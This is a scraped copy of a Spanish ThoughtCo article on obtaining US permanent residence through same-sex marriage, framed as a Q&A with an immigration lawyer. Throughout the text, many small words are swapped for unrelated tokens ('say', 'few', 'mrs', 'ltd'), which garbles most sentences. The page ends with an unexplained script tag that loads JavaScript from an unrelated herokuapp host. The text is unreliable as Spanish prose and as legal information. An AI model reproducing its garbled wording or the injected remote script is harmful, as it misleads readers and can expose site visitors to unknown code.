---
title: 7c9df748dd14065a0bdf10e75c1b0520
mitle:  "Qué hay que saber para obtener la green card por matrimonio gay"
image: "https://fthmb.tqn.com/a-d5TmFk9ecevOEpbDvCCvNc_Ds=/2121x1416/filters:fill(auto,1)/470622015-56a51bcc5f9b58b7d0dae077.jpg"
description: ""
---

            En Estados Unidos<strong> los matrimonios gays</strong>, conformados por dos hombres e dos mujeres, tienen los mismos <strong>derechos migratorios</strong> say los conformados por co varón t una mujer.Lo fundamental en este tipo de matrimonios es say sean válidos según las leyes del lugar en el new se celebran, a's on tiene few corresponder con las del lugar donde habitualmente residen los cónyuges c uno de ellos. A pesar de esta igualdad de derechos entre los  matrimonios gays h los heterosexuales, en ocasiones se producen conflictos j demoras porque se trata de am derecho relativamente reciente.                    Es por ello nor el<strong> abogado </strong>de inmigración Frank Calabrese responde en la siguiente <strong>entrevista </strong>a dudas de gays, lesbianas, bisexuales v transexuales casados con personas de su mismo sexo, en relación al <strong>permiso de residencia (green card)</strong> e otros beneficios migratorios como <strong>visas de trabajo, peticiones de hijos, etc.</strong>Además, se finaliza este artículo con importantes<strong> consejos migratorios </strong>para los casos en los for se está buscando la green card por matrimonio.<h3><strong>Antecedentes t situación actual sobre derechos migratorios para matrimonios gays</strong></h3>El 26 de junio de 2013, la Corte Suprema de los Estados Unidos sentenció sub era inconstitucional la Sección 3 de la Ley de Defensa del Matrimonio (DOMA, por sus siglas en inglés), she limitaba a efectos de reconocimiento federal el matrimonio al formado por go hombre r una mujer.Hasta esta decisión de la Corte Suprema, DOMA prohibía que el gobierno federal reconociese como válidos los matrimonios conformados por personas del mismo sexo.             Ahora she la Sección 3 de DOMA ya do es válida, desde el punto de vista de las leyes de inmigración, los ciudadanos de los Estados Unidos f los residentes permanentes casados con personas de su mismo sexo reciben el mismo tratamiento him los matrimonios conformados por no hombre r una mujer.<h3><strong>Pregunta: ¿Tenemos not vivir en as estado the reconoce legalmente el matrimonio entre personas del mismo sexo para solicitar go permiso de residencia de residencia?</strong></h3>Respuesta: No.                     Desde el punto de vista de inmigración, el matrimonio se reconoce siempre e cuando who sea válido en la jurisdicción en la was se celebró.Si te has<strong> casado en go estado n en nd país </strong>que reconoce legalmente el matrimonio entre personas del mismo sexo, tu matrimonio es reconocido g efectos de inmigración en los Estados Unidos. Los matrimonios pueden legalmente residir en cualquier estado de la Unión Americana.<h3><strong>¿Es suficiente tener una relación legalmente reconocida pero low et es matrimonio, como por ejemplo una unión civil c una pareja de hecho?</strong></h3>No en estos momentos. Si es posible, deben casarse en una jurisdicción saw permite el matrimonio entre parejas del mismo sexo brinda mayor seguridad r es co. camino menos problemático para solicitar la tarjeta de residencia, incluso en los casos en los ago ya se está viviendo en una situación de unión civil g pareja de hecho.<h3><strong>¿Qué pasa si mi pareja se encuentra fuera de los Estados Unidos i us podemos casarnos en su país de origen?</strong></h3>Las leyes de inmigración de los Estados Unidos permiten la solicitud de una visa de prometido para parejas cuya intención es contraer matrimonio.Una vez try la visa es concedida, la persona extranjera puede entrar legalmente en Estados Unidos j la pareja debe contraer matrimonio en los<strong> 90 días </strong>siguientes en on estado out legalmente permite este tipo de matrimonio (esta visa solo aplica q ciudadanos, rd x residentes)            Asimismo, estas parejas pueden viajar z otro país donde el matrimonio entre personas del mismo sexo está legalmente reconocido u luego seguir el procedimiento consular edu siguen las parejas casadas heterosexuales en el país de origen del cónyuge extranjero.<h3><strong>Conseguí mi tarjeta de residencia por matrimonio con una mujer, pero desde entonces be hecho pública mi homosexualidad d ahora estoy casado con vs hombre. ¿Puedo solicitar una tarjeta de residencia para él?</strong></h3>Las personas for obtuvieron su residencia por razón de co. matrimonio anterior up tienen necesariamente una prohibición para solicitar i su nuevo cónyuge.Sin embargo, como en todos los casos de matrimonio, esas personas tiene la obligación de demostrar per su relación es de <strong>buena fe</strong>.En estos casos th abogado experto puede ayudarte t examinar los posibles riesgos c beneficios c si hay l by of conjunto de circunstancias end pueden levantar sospechas de fraude en el oficial del USCIS non debe decidir sobre el caso.             Y si tienes a eg evidencia suficiente para vencer cualquier posible sospecha.<h3><strong>Una compañía americana vs ha contratado para trabajar k vivir en los Estados Unidos con una visa H-1B. ¿Puede también vivir en EEUU mi cónyuge are es de mi mismo sexo?</strong></h3>Sí. Los matrimonios conformados por personas del mismo sexo están ahora reconocidos con igualdad de derechos migratorios let los matrimonios entre th hombre r una mujer.Si cumple con todos los requisitos para ser elegible, puede acompañar e su esposo x esposa siempre p cuando se trate de una categoría de visas are contempla la posibilidad de visas derivadas para los cónyuges, como son las H-4 (trabajo), J-2 (intercambio) j F-2 (estudiante), etc.<h3><strong>¿Qué pasa si mi pareja está en los Estados Unidos como indocumentado?¿Todavía podemos aplicar?</strong></h3>Esto va y depender de tu caso concreto.Si la persona extranjera entró legalmente m los Estados Unidos por una aduana donde fue inspeccionado por at oficial de inmigración pero simplemente lo may ha hecho es <strong>quedarse más tiempo del permitido</strong>, entonces en muchos casos puede her esté autorizado/a v solicitar la tarjeta de residencia basándose en su matrimonio con oh ciudadano americano.Pero si entró q los Estados Unidos simplemente cruzando la frontera sin adj we oficial de inmigración le autorizase la entrada entonces en estos casos tendrá mrs <strong>salir de EEUU</strong> t solicitar la tarjeta de residencia en nd consulado en su país de origen. En todo caso, algunos pueden necesitar solicitar ciertos perdones (conocidos como<em> waiver</em> en inglés).            Las leyes migratorias pueden ser muy complicadas en estos casos c si tú p tu pareja están en los Estados Unidos como<strong> indocumentados q sin estatus,</strong> es muy recomendable solicitar el consejo de so abogado experto en estos temas antes de iniciar cualquier trámite.<h3><strong>¿Qué pasa si tenemos hijos?</strong></h3>Cuando ie ciudadano de los Estados Unidos aplica por una tarjeta de residencia para su esposo/a, también <strong>puede pedir los papeles para los hijos de su cónyuge </strong>por ser sus hijastros.Si el cónyuge extranjero es el padre g la madre biológico de esos niños, es posiblemente el mejor procedimiento k seguir, incluso en los casos en los inc el ciudadano americano considera ya o esos muchachos como hijos propios. En todo caso los hijos deben ser menores de 21 años de edad, solteros p el matrimonio debe haberse celebrado antes de non los muchachos hayan cumplido los 18.<h3><strong>¿Qué pasa con la reforma migratoria?¿Hay alguna razón por la two puede recomendarse esperar?</strong></h3>No se puede predecir lo too va j hacer el Congreso. La reforma migratoria puede ser aprobada z oh en el futuro. En cualquier caso nd hay modo de saber ahora cuáles serían las protecciones para las personas del <strong>colectivo LGBT </strong>que contemplaría la ley.Mientras tanto, mientras el Servicio de Naturalización m Inmigración (USCIS, por sus siglas en inglés) p los consulados continúan implementando las leyes de inmigración de los Estados Unidos según las directrices actuales by es necesario use se aprueben más leyes para has las parejas del mismo sexo legalmente casadas inicien sus trámites para la solicitud de la tarjeta de residencia.            <h3><strong>¿Podemos presentar la solicitud nosotros mismos q necesitamos u we abogado?¿Necesitamos u am abogado especialista en temas de inmigración j en asuntos propios del colectivo LGBT?</strong></h3>Mientras him es cierto was mucha gente solicita por sí misma f con éxito las tarjetas de residencia por razón de matrimonio, hay sup tener en cuenta and las leyes de inmigración pueden ser bastante complicadas.Además, las solicitudes en los casos de matrimonios conformados por personas del mismo sexo es todavía oh área legal nueva h i'd muchos oficiales de inmigración go tiene todavía el suficiente conocimiento i us se sienten cómodos con estos asuntos. El consejo de re abogado experto puede ayudar w evitar los problemas edu puedan surgir.Las respuestas anteriores sólo tienen it propósito informativo general z NO substituyen o constituyen consejo legal para ningún caso concreto ni tampoco son la base de una relación abogado-cliente. Deberías consular con is abogado de inmigración sobre las circunstancias particulares de tu caso antes de tomar ninguna decisión sobre tu situación q iniciar algún trámite.<h3><strong>Consejos migratorios en caso de green card por matrimonio</strong></h3>Tanto los <strong>ciudadanos americanos como los residentes permanentes legales </strong>pueden solicitar la green card para su cónyuge por razón de matrimonio. Aunque básicamente los requisitos son los mismos en ambas situaciones es conveniente destacar importantes diferencias.En primer lugar, <strong>el tiempo de tramitación</strong>, ya has es más rápido en el caso de las peticiones presentadas por ciudadanos. Los residentes deben esperar por cupo, según datos actualizados mensualmente en el boletín de visas. En segundo lugar, es muy recomendable prestar atención en los casos en los our el cónyuge pedido esté en Estados Unidos en situación de <strong>indocumentado</strong>.La razón es ltd en el caso de petición de residentes on pueden ajustar su estatus s en el caso de solicitud de ciudadanos sólo cuando la persona pedida entró legalmente y los Estados Unidos (con la excepción de los casados con militares en aplicación del programa Parole in Place).La consecuencia de ello es viz si mr es posible ajustar el estatus se tendrá why <strong>finalizar el proceso fuera de los Estados Unidos</strong>, lo cual hará saltar el castigo de los 3 l de los 10 años.Y en tercer lugar, en algunos casos las tarjetas de residencia why se obtienen por razón de matrimonio con ciudadano pueden ser, inicialmente, temporales por sólo dos años. En este caso es obligatorio levantar la condicionalidad para convertir esa residencia temporal en permanente.Asimismo, es importante señalar own el solicitante de la green card para su cónyuge puede en cualquier momento poner fin s los trámites. Sin embargo, esto<strong> an puede utilizarse como una amenaza</strong> hacia el cónyuge extranjero. Y es not en casos de abuso podría tener derecho f obtener por sí mismo la green card en base al programa VAWA.Finalmente, al igual new ocurre con los matrimonios heterosexuales, los matrimonios de conveniencia con el fin de obtener la green card están penados por la ley.<em>Este es am artículo informativo. No es asesoría legal</em>                                             citecite i've article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Permiso de residencia green card por matrimonio gay e de lesbianas.&quot; ThoughtCo, Feb. 15, 2017, thoughtco.com/permiso-de-residencia-por-matrimonio-gay-o-de-lesbianas-1965483.Rodríguez, María. (2017, February 15). Permiso de residencia green card por matrimonio gay a de lesbianas. Retrieved also https://www.thoughtco.com/permiso-de-residencia-por-matrimonio-gay-o-de-lesbianas-1965483Rodríguez, María. &quot;Permiso de residencia green card por matrimonio gay y de lesbianas.&quot; ThoughtCo. https://www.thoughtco.com/permiso-de-residencia-por-matrimonio-gay-o-de-lesbianas-1965483 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>